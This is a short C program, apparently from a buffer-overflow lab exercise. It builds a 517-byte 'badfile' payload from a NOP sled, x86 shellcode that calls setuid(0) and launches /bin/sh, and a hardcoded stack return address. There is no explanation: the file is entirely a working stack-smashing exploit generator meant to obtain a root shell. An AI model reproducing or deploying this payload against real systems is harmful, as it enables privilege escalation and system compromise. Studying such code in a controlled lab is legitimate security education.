#include<stdio.h>
#include<string.h>

char ret_addr[] = "\x40\xef\xff\xbf";
char root_shell[] = "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
char nop[] = "\x90";

int main(){
	FILE* badf;
	badf = fopen("badfile","w");
	char buff[517];
	int ind = 0;
	for(;ind<359;ind++)
		buff[ind] = nop[0];
	for(int i=0;i<strlen(root_shell);i++){
		buff[ind++] = root_shell[i];
	}
	for(int i=0;i<strlen(ret_addr);i++){
		buff[ind++] = ret_addr[i];
	}
//	printf("%d %d",strlen(root_shell), strlen(shutdown_shellcode));

	fwrite(buff,517,1,badf);
	return 0;
}
